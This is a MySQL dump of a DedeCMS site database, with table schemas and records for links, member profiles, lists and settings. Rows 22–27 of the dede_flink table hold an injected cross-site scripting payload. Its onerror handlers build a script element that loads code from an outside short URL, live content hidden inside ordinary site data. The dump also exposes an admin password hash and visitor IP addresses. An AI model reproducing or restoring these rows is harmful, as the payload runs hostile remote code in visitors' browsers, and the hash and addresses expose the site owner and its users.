INSERT INTO dede_flink VALUES ('15', '50', 'http://www.dayinglaohuji.com/', '', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('16', '50', 'http://www.hygjyl666.com/', '', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('17', '50', 'http://www.tb0008khd.com/', 'tb0008.com', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('18', '50', 'http://www.l8gjyl.com/', '', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('19', '50', 'http://www.lanxianquy.com/', 'ͬ', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('20', '50', 'http://www.xunwuedc.com/', '', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('21', '50', 'http://www.wutaight.com/', '', '1', '1', 'admin|f297a57a5a743894a0e4', '1', '1', '1');
INSERT INTO dede_flink VALUES ('22', '50', 'http://', '', '', '', '\'&amp;quot; onerror=s=createElement(\'script\');//', '1431113557', '1', '0');
INSERT INTO dede_flink VALUES ('23', '50', 'http://', '', '', '', '\'&amp;quot; onerror=body.appendChild(s);//', '1431113557', '1', '0');
INSERT INTO dede_flink VALUES ('24', '50', 'http://', '', '', '', '\'&amp;quot; onerror=s.src=\'http://t.cn/RAl3fMa\';//', '1431113557', '1', '0');
INSERT INTO dede_flink VALUES ('25', '50', 'http://', '', '', '', '\'&amp;quot; onerror=s=createElement(\'script\');//', '1431113557', '1', '0');
INSERT INTO dede_flink VALUES ('26', '50', 'http://', '', '', '', '\'&amp;quot; onerror=body.appendChild(s);//', '1431113558', '1', '0');
INSERT INTO dede_flink VALUES ('27', '50', 'http://', '', '', '', '\'&amp;quot; onerror=s.src=\'http://t.cn/RAl3fMa\';//', '1431113558', '1', '0');

-- ----------------------------
-- Table structure for `dede_flinktype`
-- ----------------------------
DROP TABLE IF EXISTS `dede_flinktype`;
CREATE TABLE `dede_flinktype` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typename` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_flinktype
-- ----------------------------
INSERT INTO dede_flinktype VALUES ('1', '综合网站');
INSERT INTO dede_flinktype VALUES ('2', '娱乐类');
INSERT INTO dede_flinktype VALUES ('3', '教育类');
INSERT INTO dede_flinktype VALUES ('4', '计算机类');
INSERT INTO dede_flinktype VALUES ('5', '电子商务');
INSERT INTO dede_flinktype VALUES ('6', '网上信息');
INSERT INTO dede_flinktype VALUES ('7', '论坛类');
INSERT INTO dede_flinktype VALUES ('8', '其它类型');

-- ----------------------------
-- Table structure for `dede_freelist`
-- ----------------------------
DROP TABLE IF EXISTS `dede_freelist`;
CREATE TABLE `dede_freelist` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL DEFAULT '',
  `namerule` varchar(50) NOT NULL DEFAULT '',
  `listdir` varchar(60) NOT NULL DEFAULT '',
  `defaultpage` varchar(20) NOT NULL DEFAULT '',
  `nodefault` smallint(6) NOT NULL DEFAULT '0',
  `templet` varchar(50) NOT NULL DEFAULT '',
  `edtime` int(11) NOT NULL DEFAULT '0',
  `maxpage` smallint(5) unsigned NOT NULL DEFAULT '100',
  `click` int(11) NOT NULL DEFAULT '1',
  `listtag` mediumtext,
  `keywords` varchar(100) NOT NULL DEFAULT '',
  `description` varchar(250) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_freelist
-- ----------------------------
INSERT INTO dede_freelist VALUES ('1', '测试内容', '{listdir}/index_{listid}_{page}.html', '{cmspath}/freelist/', 'index.html', '1', '{style}/list_free.htm', '1289712633', '100', '0', '{dede:list  pagesize=\"30\" col=\"1\" titlelen=\"60\" orderby=\"pubdate\" orderway=\"desc\"  typeid=\"1\"  channel=\"1\" }<li>[field:imglink/] [field:textlink/] <span class=info><small>日期：</small>[field:pubdate function=\"getdatemk(@me)\"/] <small>点击：</small>[field:click/] <small>好评：</small>[field:scores/] </span>	\n<p class=intro>[field:description/]...</p></li>{/dede:list}', '阿三大厦大大', '阿三大厦大厦大撒');
INSERT INTO dede_freelist VALUES ('10', 'Google SiteMap 生成器', '{listdir}googlemap_{page}.xml', '{cmspath}', 'index.html', '1', '{style}/googlemap.htm', '1226884666', '100', '0', '{dede:list  pagesize=\"500\" col=\"1\" titlelen=\"60\" orderby=\"pubdate\" orderway=\"desc\" 	\n channel=\"1\"  keyword=\"\" }<url>	\n   <loc>[field:arcurl function=\"Gmapurl(@me)\"/]</loc> 	\n   <title>[field:title function=\"HtmlReplace(@me)\"/]</title>	\n   <news:news>	\n  <news:keywords>[field:keywords/]</news:keywords>	\n <news:publication_date>[field:senddate function=\"strftime(\"%Y-%m-%d\",@me)\"/]</news:publication_date>	\n </news:news>	\n</url>{/dede:list}', '', '');

-- ----------------------------
-- Table structure for `dede_homepageset`
-- ----------------------------
DROP TABLE IF EXISTS `dede_homepageset`;
CREATE TABLE `dede_homepageset` (
  `templet` char(50) NOT NULL DEFAULT '',
  `position` char(30) NOT NULL DEFAULT '',
  `showmod` tinyint(2) NOT NULL DEFAULT '1'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_homepageset
-- ----------------------------
INSERT INTO dede_homepageset VALUES ('qunli/index.htm', '../index.html', '1');

-- ----------------------------
-- Table structure for `dede_honor`
-- ----------------------------
DROP TABLE IF EXISTS `dede_honor`;
CREATE TABLE `dede_honor` (
  `aid` int(11) NOT NULL DEFAULT '0',
  `typeid` int(11) NOT NULL DEFAULT '0',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_honor
-- ----------------------------
INSERT INTO dede_honor VALUES ('46', '11', '', '', '220.166.214.173');
INSERT INTO dede_honor VALUES ('47', '11', '', '', '220.166.214.173');
INSERT INTO dede_honor VALUES ('48', '11', '', '', '220.166.214.173');
INSERT INTO dede_honor VALUES ('127', '11', '', '', '182.151.165.30');
INSERT INTO dede_honor VALUES ('128', '11', '', '', '182.151.165.30');
INSERT INTO dede_honor VALUES ('129', '11', '', '', '182.151.165.30');

-- ----------------------------
-- Table structure for `dede_keywords`
-- ----------------------------
DROP TABLE IF EXISTS `dede_keywords`;
CREATE TABLE `dede_keywords` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `keyword` char(16) NOT NULL DEFAULT '',
  `rank` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `sta` smallint(6) NOT NULL DEFAULT '1',
  `rpurl` char(60) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `keyword` (`keyword`,`rank`,`sta`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_keywords
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_log`
-- ----------------------------
DROP TABLE IF EXISTS `dede_log`;
CREATE TABLE `dede_log` (
  `lid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `adminid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `filename` char(60) NOT NULL DEFAULT '',
  `method` char(10) NOT NULL DEFAULT '',
  `query` char(200) NOT NULL DEFAULT '',
  `cip` char(15) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_log
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member`;
CREATE TABLE `dede_member` (
  `mid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mtype` varchar(20) NOT NULL DEFAULT '个人',
  `userid` char(20) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `uname` char(36) NOT NULL DEFAULT '',
  `sex` enum('男','女','保密') NOT NULL DEFAULT '保密',
  `rank` smallint(5) unsigned NOT NULL DEFAULT '0',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `exptime` smallint(6) NOT NULL DEFAULT '0',
  `money` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `email` char(50) NOT NULL DEFAULT '',
  `scores` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `matt` smallint(5) unsigned NOT NULL DEFAULT '0',
  `spacesta` smallint(6) NOT NULL DEFAULT '0',
  `face` char(50) NOT NULL DEFAULT '',
  `safequestion` smallint(5) unsigned NOT NULL DEFAULT '0',
  `safeanswer` char(30) NOT NULL DEFAULT '',
  `jointime` int(10) unsigned NOT NULL DEFAULT '0',
  `joinip` char(16) NOT NULL DEFAULT '',
  `logintime` int(10) unsigned NOT NULL DEFAULT '0',
  `loginip` char(16) NOT NULL DEFAULT '',
  `checkmail` smallint(6) NOT NULL DEFAULT '-1',
  PRIMARY KEY (`mid`),
  KEY `userid` (`userid`,`sex`) USING BTREE,
  KEY `logintime` (`logintime`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member
-- ----------------------------
INSERT INTO dede_member VALUES ('1', '个人', 'admin', '6d7622e8aeb39d185ff0205e89564367', 'admin', '男', '100', '0', '0', '0', '', '10000', '10', '0', '', '0', '', '1428733726', '', '1432548933', '171.221.133.112', '-1');

-- ----------------------------
-- Table structure for `dede_member_company`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_company`;
CREATE TABLE `dede_member_company` (
  `mid` mediumint(8) NOT NULL AUTO_INCREMENT,
  `company` varchar(36) NOT NULL DEFAULT '',
  `product` varchar(50) NOT NULL DEFAULT '',
  `place` smallint(5) unsigned NOT NULL DEFAULT '0',
  `vocation` smallint(5) unsigned NOT NULL DEFAULT '0',
  `cosize` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tel` varchar(30) NOT NULL DEFAULT '',
  `fax` varchar(30) NOT NULL DEFAULT '',
  `linkman` varchar(20) NOT NULL DEFAULT '',
  `address` varchar(50) NOT NULL DEFAULT '',
  `mobile` varchar(30) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `url` varchar(50) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `introduce` text,
  `comface` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_company
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_feed`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_feed`;
CREATE TABLE `dede_member_feed` (
  `fid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mid` smallint(8) unsigned NOT NULL DEFAULT '0',
  `userid` char(20) NOT NULL DEFAULT '',
  `uname` char(36) NOT NULL DEFAULT '',
  `type` char(20) CHARACTER SET gb2312 NOT NULL DEFAULT '0',
  `aid` mediumint(8) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `title` char(253) NOT NULL,
  `note` char(200) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL,
  PRIMARY KEY (`fid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_feed
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_flink`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_flink`;
CREATE TABLE `dede_member_flink` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` varchar(30) NOT NULL DEFAULT '',
  `url` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_flink
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_friends`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_friends`;
CREATE TABLE `dede_member_friends` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `fid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `floginid` char(20) NOT NULL DEFAULT '',
  `funame` char(36) NOT NULL DEFAULT '',
  `mid` mediumint(8) NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `ftype` tinyint(4) NOT NULL DEFAULT '0',
  `groupid` int(8) NOT NULL DEFAULT '1',
  `description` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `fid` (`fid`,`mid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_friends
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_group`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_group`;
CREATE TABLE `dede_member_group` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `groupname` varchar(50) NOT NULL,
  `mid` int(8) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_group
-- ----------------------------
INSERT INTO dede_member_group VALUES ('1', '朋友', '0');

-- ----------------------------
-- Table structure for `dede_member_guestbook`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_guestbook`;
CREATE TABLE `dede_member_guestbook` (
  `aid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `gid` varchar(20) NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `uname` varchar(50) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `qq` varchar(50) NOT NULL DEFAULT '',
  `tel` varchar(50) NOT NULL DEFAULT '',
  `ip` varchar(20) NOT NULL DEFAULT '',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`aid`),
  KEY `mid` (`mid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_guestbook
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_model`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_model`;
CREATE TABLE `dede_member_model` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `table` varchar(30) NOT NULL,
  `description` varchar(50) NOT NULL,
  `state` int(2) NOT NULL DEFAULT '0',
  `issystem` int(2) NOT NULL DEFAULT '0',
  `info` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_model
-- ----------------------------
INSERT INTO dede_member_model VALUES ('1', '个人', 'dede_member_person', '个人会员模型', '1', '1', '	\n<field:onlynet itemname=\"联系方式限制\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"1\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:onlynet>	\n	\n<field:sex itemname=\"性别\" autofield=\"1\" type=\"radio\" isnull=\"true\" default=\"男,女,保密\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:sex>	\n	\n<field:uname itemname=\"昵称/公司名称\" autofield=\"1\" type=\"textchar\" isnull=\"true\" default=\"\"  maxlength=\"30\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:uname>	\n	\n<field:qq itemname=\"QQ\" autofield=\"1\" type=\"textchar\" isnull=\"true\" default=\"\"  maxlength=\"12\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:qq>	\n	\n<field:msn itemname=\"MSN\" autofield=\"1\" type=\"textchar\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:msn>	\n	\n<field:tel itemname=\"电话号码\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"15\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:tel>	\n	\n<field:mobile itemname=\"手机\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"15\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:mobile>	\n	\n<field:place itemname=\"目前所在地\" autofield=\"1\" type=\"int\" default=\"0\"  maxlength=\"5\" issearch=\"0\" isshow=\"0\" state=\"1\">	\n</field:place>	\n	\n	\n<field:oldplace itemname=\"家乡所在地\" autofield=\"1\" type=\"int\" default=\"0\"  maxlength=\"5\" issearch=\"0\" isshow=\"0\" state=\"1\">	\n</field:oldplace>	\n	\n	\n<field:birthday itemname=\"生日\" autofield=\"1\" type=\"datetime\" isnull=\"true\" default=\"\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:birthday>	\n	\n<field:star itemname=\"星座\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"1\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:star>	\n	\n<field:income itemname=\"收入\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:income>	\n	\n<field:education itemname=\"学历\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:education>	\n	\n<field:height itemname=\"身高\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"160\"  maxlength=\"5\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:height>	\n	\n<field:bodytype itemname=\"体重\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:bodytype>	\n	\n<field:blood itemname=\"血型\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:blood>	\n	\n<field:vocation itemname=\"职业\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:vocation>	\n	\n<field:smoke itemname=\"吸烟\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:smoke>	\n	\n<field:marital itemname=\"婚姻状况\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:marital>	\n	\n<field:house itemname=\"住房\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:house>	\n	\n<field:drink itemname=\"饮酒\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:drink>	\n	\n<field:datingtype itemname=\"交友\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"6\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:datingtype>	\n	\n<field:language itemname=\"语言\" autofield=\"1\" type=\"checkbox\" isnull=\"true\" default=\"普通话,上海话,广东话,英语,日语,韩语,法语,意大利语,德语,西班牙语,俄语,阿拉伯语\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:language>	\n	\n	\n<field:nature itemname=\"性格\" autofield=\"1\" type=\"checkbox\" isnull=\"true\" default=\"性格外向,性格内向,活泼开朗,豪放不羁,患得患失,冲动,幽默,稳重,轻浮,沉默寡言,多愁善感,时喜时悲,附庸风雅,能说会道,坚强,脆弱,幼稚,成熟,快言快语,损人利己,狡猾善变,交际广泛,优柔寡断,自私,真诚,独立,依赖,难以琢磨,悲观消极,郁郁寡欢,胆小怕事,乐观向上,任性,自负,自卑,拜金,温柔体贴,小心翼翼,暴力倾向,逆来顺受,不拘小节,暴躁,倔强,豪爽,害羞,婆婆妈妈,敢做敢当,助人为乐,耿直,虚伪,孤僻,老实,守旧,敏感,迟钝,婆婆妈妈,武断,果断,刻薄\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:nature>	\n	\n<field:lovemsg itemname=\"人生格言\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"100\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:lovemsg>	\n	\n<field:address itemname=\"家庭住址\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:address>	\n	\n<field:uptime itemname=\"更新时间\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"\"  maxlength=\"10\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:uptime>	\n');
INSERT INTO dede_member_model VALUES ('2', '企业', 'dede_member_company', '公司企业会员模型', '1', '1', '	\n<field:company itemname=\"公司名称\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"36\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:company>	\n	\n<field:product itemname=\"公司产品\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:product>	\n	\n<field:place itemname=\"所在地址\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"5\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:place>	\n	\n<field:vocation itemname=\"所属行业\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"5\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:vocation>	\n	\n<field:cosize itemname=\"公司规模\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"5\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:cosize>	\n	\n<field:tel itemname=\"电话号码\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"30\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:tel>	\n	\n<field:fax itemname=\"传真\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"30\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:fax>	\n	\n<field:linkman itemname=\"联系人\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"20\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:linkman>	\n	\n<field:address itemname=\"详细地址\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:address>	\n	\n<field:mobile itemname=\"手机\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"30\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:mobile>	\n	\n<field:email itemname=\"邮箱\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:email>	\n	\n<field:url itemname=\"地址\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"50\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:url>	\n	\n<field:uptime itemname=\"更新时间\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"10\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:uptime>	\n	\n<field:checked itemname=\"是否审核\" autofield=\"1\" type=\"int\" isnull=\"true\" default=\"0\"  maxlength=\"1\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:checked>	\n	\n<field:introduce itemname=\"公司简介\" autofield=\"1\" type=\"multitext\" isnull=\"true\" default=\"\"  maxlength=\"250\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:introduce>	\n	\n<field:comface itemname=\"公司标志\" autofield=\"1\" type=\"text\" isnull=\"true\" default=\"\"  maxlength=\"255\" issearch=\"\" isshow=\"\" state=\"1\">	\n</field:comface>	\n');

-- ----------------------------
-- Table structure for `dede_member_msg`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_msg`;
CREATE TABLE `dede_member_msg` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `userid` char(20) NOT NULL DEFAULT '',
  `ip` char(15) NOT NULL DEFAULT '',
  `ischeck` smallint(6) NOT NULL DEFAULT '0',
  `dtime` int(10) unsigned NOT NULL DEFAULT '0',
  `msg` text,
  PRIMARY KEY (`id`),
  KEY `id` (`ischeck`,`mid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_msg
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_operation`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_operation`;
CREATE TABLE `dede_member_operation` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `buyid` varchar(80) NOT NULL DEFAULT '',
  `pname` varchar(50) NOT NULL DEFAULT '',
  `product` varchar(10) NOT NULL DEFAULT '',
  `money` int(11) NOT NULL DEFAULT '0',
  `mtime` int(11) NOT NULL DEFAULT '0',
  `pid` int(11) NOT NULL DEFAULT '0',
  `mid` int(11) NOT NULL DEFAULT '0',
  `sta` int(11) NOT NULL DEFAULT '0',
  `oldinfo` varchar(200) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `buyid` (`buyid`) USING BTREE,
  KEY `pid` (`pid`,`mid`,`sta`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_operation
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_pms`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_pms`;
CREATE TABLE `dede_member_pms` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `floginid` varchar(20) NOT NULL DEFAULT '',
  `fromid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `toid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `tologinid` char(20) NOT NULL DEFAULT '',
  `folder` enum('inbox','outbox') DEFAULT 'inbox',
  `subject` varchar(60) NOT NULL DEFAULT '',
  `sendtime` int(10) unsigned NOT NULL DEFAULT '0',
  `writetime` int(10) unsigned NOT NULL DEFAULT '0',
  `hasview` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `isadmin` tinyint(1) NOT NULL DEFAULT '0',
  `message` text,
  PRIMARY KEY (`id`),
  KEY `sendtime` (`sendtime`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_pms
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_snsmsg`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_snsmsg`;
CREATE TABLE `dede_member_snsmsg` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `userid` varchar(20) NOT NULL,
  `sendtime` int(10) unsigned NOT NULL DEFAULT '0',
  `msg` varchar(250) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_snsmsg
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_space`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_space`;
CREATE TABLE `dede_member_space` (
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `pagesize` smallint(5) unsigned NOT NULL DEFAULT '10',
  `matt` smallint(6) NOT NULL DEFAULT '0',
  `spacename` varchar(50) NOT NULL DEFAULT '',
  `spacelogo` varchar(50) NOT NULL DEFAULT '',
  `spacestyle` varchar(20) NOT NULL DEFAULT '',
  `sign` varchar(100) NOT NULL DEFAULT '没签名',
  `spacenews` text,
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_space
-- ----------------------------
INSERT INTO dede_member_space VALUES ('1', '10', '0', 'admin的空间', '', 'person', '', '');

-- ----------------------------
-- Table structure for `dede_member_stow`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_stow`;
CREATE TABLE `dede_member_stow` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `type` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `uid` (`mid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_stow
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_member_stowtype`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_stowtype`;
CREATE TABLE `dede_member_stowtype` (
  `stowname` varchar(30) NOT NULL,
